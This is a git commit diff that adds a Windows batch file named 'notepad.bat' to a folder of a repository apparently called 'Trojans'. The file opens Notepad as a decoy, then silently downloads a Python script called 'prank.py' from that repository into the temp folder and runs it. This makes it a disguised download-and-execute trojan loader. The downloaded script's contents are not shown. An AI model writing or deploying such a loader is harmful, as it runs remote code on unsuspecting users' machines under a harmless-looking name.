760160d22f624beab4f04edb3c72d55979e39599
Nihal Awasthi <137594290+nihalawasthi@users.noreply.github.com>
2024-05-18 22:24:15 +0530

    Add files via upload

--- Friendly first/notepad.bat
+++ Friendly first/notepad.bat
@@ -1,4 +1,5 @@
-notepad
-pip install pyfiglet
+@echo off
+powershell -Command "notepad"
 cd %TEMP%
-Powershell -Command "Invoke-WebRequest '' -OutFile pacman.py"
+Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/nihalawasthi/Trojans/main/Friendly%20first/prank.py' -OutFile prank.py"
+python3 prank.py
